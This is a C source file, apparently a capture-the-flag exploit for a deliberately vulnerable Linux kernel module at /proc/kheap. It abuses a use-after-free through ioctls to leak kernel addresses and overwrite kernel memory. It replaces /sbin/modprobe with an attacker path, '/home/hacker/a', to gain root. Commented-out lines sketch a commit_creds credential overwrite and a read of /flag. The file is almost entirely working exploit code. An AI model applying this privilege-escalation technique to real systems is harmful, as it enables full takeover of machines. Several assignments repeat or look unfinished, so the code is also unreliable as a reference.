
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>

typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

unsigned long modpath[] ={
0x6f6d2f6e6962732f, 0x000065626f727064,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000003200000000, 0xffffffff9e93f5c8,
0xffffffff9e93f5c8, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0xffffffff9e93f5f0, 0xffffffff9e93f5f0,
0x0000000000000001, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0xffffffff9e4bdd53, 0xffffffff9e93f6a0,
0x000001a400000004, 0x0000000000000000,
0xffffffff9cf323e0, 0x0000000000000000,
0xffffffff9e00e3e0, 0xffffffff9e00e3e4,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000,
0x0000000000000001, 0x0000000000000000,
0x0000000000000000, 0x0000000000000000
};

unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int main()
{
    int fd[512];
    char buf [1024];
    unsigned long do_print_addr = 0;
    int fd_save = -1;
    kheap_req_t kheap_req = {
        .ubuf = buf,
        .size = 0x1d0
    };
    unsigned long leak[2];
    memcpy(buf, "AAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;
    int do_print = 0x5702;
    int pre_flag = 0x5704;
    int cp_user = 0x5700;
    int kefree = 0x5703;
    int cp_from_user = 0x5701;
    for (int i = 0; i < 2; i++)
        fd[i] = open("/proc/kheap", 0);
    
    for (int i = 1; i >= 0; i--)
        ioctl(fd[i], kefree, &kheap_req);
    
    for (int i = 0; i < 2; i++)
    {
        ioctl(fd[i], cp_user, &kheap_req);
        leak[i] = print_value(buf, 29);
    }
    unsigned long leak_ker = 0xffffffffaec58c20;
    scanf("%llx", &leak_ker);
    *(unsigned long*)(buf + 29*8) = leak_ker + (0xffffffff9e93f4c0 - 0xffffffff9e858c20);
    ioctl(fd[0], cp_from_user, &kheap_req);

 
    for (int i = 2; i < 4; i++)
    {
        fd[i] = open("/proc/kheap", 0);
        ioctl(fd[i], cp_user, &kheap_req);
        if (i == 3){
            fd_save = i;
            break;
        }
    }

    modpath[33] = leak_ker - (0xffffffff9e93f5c8 - 0xffffffff9e858c20);
    modpath[34] = leak_ker - (0xffffffff9e93f5c8 - 0xffffffff9e858c20);
    modpath[38] = leak_ker - (0xffffffff9e93f5f0 - 0xffffffff9e858c20);
    modpath[39] = leak_ker - (0xffffffff9e93f5f0 - 0xffffffff9e858c20);
    modpath[44] = leak_ker + (0xffffffff9e858c20 - 0xffffffff9e4bdd53);
    modpath[45] = leak_ker - (0xffffffff9e93f6a0 - 0xffffffff9e858c20);
    modpath[48] = leak_ker + (0xffffffff9e858c20 - 0xffffffff9cf323e0);
    modpath[33] = leak_ker + (0xffffffff9e858c20 - 0xffffffff9e00e3e0);
    modpath[33] = leak_ker + (0xffffffff9e858c20 - 0xffffffff9e00e3e4);

    memcpy(buf, modpath, 0x200);
    memcpy(buf, "/home/hacker/a", 15);
    // *(unsigned long*)(buf + 0x1a8) += 0xe; 

    ioctl(fd[fd_save], cp_from_user, &kheap_req);
    // memcpy(buf, "0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx\n0x%llx 0x%llx 0x%llx 0x%llx\n", 0x119);
    // ioctl(fd[17], cp_from_user, &kheap_req);
    // ioctl(fd[17], do_print, &kheap_req);
    
    // unsigned long leak_ret = 0;
    // unsigned long leak_data = 0;
    // scanf("%llx", &leak_ret);
    // scanf("%llx", &leak_data);


    // unsigned long commit_creds = 0;
    // commit_creds = leak_ret - (0xffffffffae1296d5 - 0xffffffffadeb8bb0);

    // init_cred[16] = leak_data - (0xffffa027423c5100 - 0xffffa027410478c0);
    // init_cred[17] = leak_ret + (0xffffffffaf851560 - 0xffffffffae1296d5);
    // init_cred[18] = leak_ret + (0xffffffffaf851600 - 0xffffffffae1296d5);
    // init_cred[19] = leak_ret + (0xffffffffaf853800 - 0xffffffffae1296d5);
    // init_cred[20] = leak_ret + (0xffffffffaf852fd8 - 0xffffffffae1296d5);

    // *(unsigned long*)(buf + 0x1a8) = commit_creds; 
    // ioctl(fd[fd_save], cp_from_user, &kheap_req);
    // memcpy(buf, init_cred, sizeof(init_cred));
    // ioctl(fd[17], cp_from_user, &kheap_req);
    // ioctl(fd[17], do_print, &kheap_req);

    // for (int i = 0; i < 8; i++)
    // {
    //     ioctl(fd[i], cp_from_user, &kheap_req);
    // }
    // for (int i = 0; i < 8; i++)
    // {
    //     ioctl(fd[i], do_print, &kheap_req);
    // }

    // int flag = open("/flag", O_RDONLY);
    // sendfile(1, flag, NULL, 0x100);
    
    return 0;
}